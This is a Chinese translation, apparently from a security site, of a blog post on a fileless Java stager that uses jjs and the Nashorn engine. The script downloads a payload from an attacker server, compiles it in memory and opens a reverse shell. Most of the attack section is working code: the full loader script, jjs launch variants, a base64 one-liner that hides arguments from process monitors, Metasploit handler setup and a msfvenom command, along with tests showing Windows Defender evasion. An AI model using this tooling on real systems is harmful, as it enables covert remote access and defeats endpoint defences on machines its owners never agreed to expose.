**前段时间在网上读了一篇有关java传输器的博客[Java Stager without the
Stager](https://cornerpirate.com/2018/08/28/java-stager-without-the-stager/)。该文讲述了利用java的jjs组件和Nashorn引擎下载并执行payload，由于该利用程序不含恶意代码因此免疫大部分杀软的查杀，又由于payload在内存中编译执行，许多实时防御系统也无法检测到。现将该文翻译如下：**

最近我一直在研究java，实际上，这是本月出的第三篇博客。

[博客一](https://cornerpirate.com/2018/08/06/java-stager-hide-from-av-in-memory/)这篇文章里我展示了一个java传输器，用它可以下载payload，在内存中编译它并执行。

[博客二](https://cornerpirate.com/2018/08/17/java-gives-a-shell-for-everything/)
这篇文章里我介绍了利用jjs(jre环境组件,自java8引入）在安装了java的设备上做一些坏事。它通过调用Nashorn引擎以javascript语法访问java对象。

在本文中，我将综合以上两种方法通过Nashorn在“无”java传输器的情况下传送payload。

## 缺陷分析

我们重新分析一下传输器的目标及特性：

> **传输器是上传到目标主机的一个执行文件或脚本。**
>
> **传输器必须是正常代码以躲避杀软的粗暴分析。**
>
> **传输器接着通过HTTP将实际payload下载到内存，这也是躲避杀软策略的方法。**

这种“躲入内存”的方法来源于James
Williams发布在油管的视频《英特网太热》（~……~）。这段视频被一家杀毒厂商以版权问题强制临时下架，这使视频一下火了。目前已有3万2千的播放量，比第二名多了3万。而第二名是一段今年BSides
Manchester会议的视频。

## Nashorn Payload

我用牛逼的Nashorn引擎实现了一个和Java传输器一样的TCP反弹SHELL。老版本可以在这里看到：<https://github.com/cornerpirate/java-stager/blob/master/src/main/java/TCPReverseShell.java>下面是使用Nashorn的新版本：

    
    
        // 将这里改为攻击者主机地址    
        var host = "http:///";
        // 通过HTTP加载NnClassLoader
        load(host + "NnClassLoader.js");   
    
        // 使用NnClassLoader下载Janino和Apache的jar包
        // Obtain these Jar files and stick them in your web root
        var L = new NnClassLoader({ urls: [host + 'janino-3.0.8.jar', host + 'commons-compiler-3.0.8.jar']});
        var P = L.type('org.codehaus.janino.SimpleCompiler');
        var SimpleCompiler = L.type("org.codehaus.janino.SimpleCompiler");
       
        // 引入我们要用的对象
        var BufferedReader = Java.type("java.io.BufferedReader");
        var InputStreamReader = Java.type("java.io.InputStreamReader");
        var StringReader = Java.type("java.io.StringReader");
        var StringBuffer = Java.type("java.lang.StringBuffer");
        var Method = Java.type("java.lang.reflect.Method");
        var URL = Java.type("java.net.URL");
        var URLConnection = Java.type("java.net.URLConnection");
    
        // 将java传输器版的Payload.java文件放在攻击者的web server上
          // 由这段代码下载payload
        var payloadServer = new URL(host + "Payload.java");
        var yc = payloadServer.openConnection();
        var ins = new BufferedReader(new InputStreamReader(yc.getInputStream()));
    
        // 将代码读入内存中的字符串中
        var inputLine;
        var payloadCode = new StringBuffer();
        while ((inputLine = ins.readLine()) != null) {
           payloadCode.append(inputLine + "\n");
        }
    
        // 关闭输入流
        ins.close();
        print("[*] Downloaded payload");
    
        // 用Janino编译
        print("[*] Compiling ....");
        var compiler = new SimpleCompiler();
        compiler.cook(new StringReader(payloadCode.toString()));
        var compiled = compiler.getClassLoader().loadClass("Payload") ;
    
        // 通过反射机制执行run方法    print("[*] Executing ....");
        var runMeth = compiled.getMethod("Run");
        // 这种方式调用的是static型的run方法
        runMeth.invoke(null);    
    
        print("[*] Payload, payloading ....");

但愿注解能够说清它的原理。大致过程是这样：

> **下载NnClassLoader.js库，它可以加载特定类。**
>
> **下载必需的两个java库（janino，comons-compiler)，内存编译时需要它们。**
>
> **下载payload并放入内存。**
>
> **在内存中编译。**
>
> **用反射机制执行payload对象的run方法来触发payload**

就和前面文章的过程一模一样。

## 准备攻击者服务器

攻击者的服务器根目录下需要反之以下文件：

1\. NnClassLoader

2\. janino-3.0.8.jar

3\. commons-compiler-3.0.8-jar

4\. Payload.java

接着你可以启动metasploit的multi/handler模块并把payload设置为"generic/shell_reverse_tcp"。

## 攻击目标主机

再次声明：这里只是以研究为目的的攻击。你要做的是将上述Nashorn代码拷贝并粘入目标机器的文本编辑器，接下来你要做的是：

> **将Nashorn代码的host设置攻击者主机**
>
> **保存js代码入磁盘，例如取名为“revshell.js”**

使用jjs的话可以有3中方法运行“revshell.js”：

### 方法一：

    
    
        # 作为jjs的参数执行
        jjs path/to/revshell.js

该方法的优点是so easy，但缺点在于当你打开Sysinternals的进程管理器时，你会看到它会暴露payload的路径，这可不怎么好。

![123.png](https://image.3001.net/images/20181015/1539570636_5bc3fbccafc61.png!small)

### 方法二：

    
    
        # 使用echo命令将标准输入通过管道发给jjs接口
        echo load("path/to/revshell.js")|jjs

再次查看进程管理器我们发现不再有路径信息暴露了。

![321.png](https://image.3001.net/images/20181015/1539570666_5bc3fbea6a7d1.png!small)

### 方法三：

    
    
        # 在jjs交互态时输入命令    
        jjs
        jjs> load("path/to/revshell.js")

这种方法的效果和第二种一样。

## 全在内存里完成

上一步骤的过程不错，但仍旧会保存一份文件在磁盘中。如果你想全部在内存中完成，可以这样做：

> **上传你的"revshell.js"到你的web server并使用"load()"**
>
> **或者直接粘贴revshell的代码到jjs的交互接口中去。**

最后一步，是将你的payload用base64编码，然后只粘贴一行命令到jjs中。在windows环境下，你还可以用powershell、certutil来进行base64编码。当你有了base64版本的payload后，只要像下面这样把它粘入"ENCODED_TEXT"部分就行：

    
    
        echo eval(new java.lang.String(java.util.Base64.decoder.decode('ENCODED_TEXT'))); |jjs

它将会在Oracle已经签名过的jjs.exe的上下文中执行，同时也避免了输入参数出现在windows进程管理器中。

## 好吧，有东西存到磁盘了^_^

Sysinternals的进程管理器的过滤功能我们发现：

![1.png](https://image.3001.net/images/20181015/1539570751_5bc3fc3f0a8f7.png!small)

我发现我们的jjs（在这里是pid 3504）创建了临时文件：

![2.png](https://image.3001.net/images/20181015/1539570760_5bc3fc48c2dee.png!small)

这其实是NnClassLoader创建的，它们是janino和common-compiler包的副本。因为它们并非恶意代码，所以能通过任何安全软件的审查。以上就是我对上一版本的java传输器的改进。

## 汇总测试

首先是攻击者启动服务器并捕捉反弹回的shell：

![3.png](https://image.3001.net/images/20181015/1539570787_5bc3fc63eb64a.png!small)

如下是目标主机在执行echo base64(payload) | jjs后的结果：

![4.png](https://image.3001.net/images/20181015/1539570799_5bc3fc6fea8fc.png!small)

Whoops!攻击成功了！

## 尝试触发杀软警报

java传输器和Nashorn例子中用的payload目前应该能躲过大多数杀软的策略。原因如下：

> **它们大多数是存在于内存中，一个经典的躲藏位置**
>
>
> **payload出自我手。任何时候最有效的逃逸杀软办法就是自己写payload。如果目标主机的杀软没有特征码来匹配你的payload，那你几乎能为所欲为了。**

正因如此，我想尝试在开启更新的Windows Defender中触发警报。我把Defender设置在high级别，接下我们用Eicar测试来触发警报。

## 加入Eicar

在我的目标虚拟机中，我用load()来获取eicar语句拷贝：

![5.png](https://image.3001.net/images/20181015/1539570904_5bc3fcd895b0b.png!small)  

下载过程没有毛病但却无法执行，因为eicar语句并不是js语句。没有报警，说明访问扫描功能无法发现内存中的Eicar，同理我们藏payload的地方难以发现。<br>

为了触发警报，我不得不用java把Eicar语句写入磁盘，如下：

![6.png](https://image.3001.net/images/20181015/1539570912_5bc3fce072c37.png!small)

当执行到"fw.close()"的时刻Defender也触发了警报。

## 最后一次测试

我做的最后一次测试时直接用msfvenom直接生成一个未编码的payload，如下：

    
    
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f asp > shell.asp  
    

然后我用load()下载它：

![7.png](https://image.3001.net/images/20181015/1539570935_5bc3fcf7d605b.png!small)

又一次Defender没有报警但它却执行失败了，同样因为它不是js文件。连msfvenom赤果果的payload都没报警我不知道还有什么需要测试了。

好了，你可以用它了，一个可以击败蓝军的只需复制粘贴就能做很多事的“空中”（原文为：离地的）文件。

## 参考文献

[1] <https://github.com/NashornTools/NnClassLoader>

[2] <http://repo1.maven.org/maven2/org/codehaus/janino/janino/>

[3] <http://repo1.maven.org/maven2/org/codehaus/janino/commons-compiler/>

***本文作者：l0stTemple，转载请注明来自FreeBuf.COM**

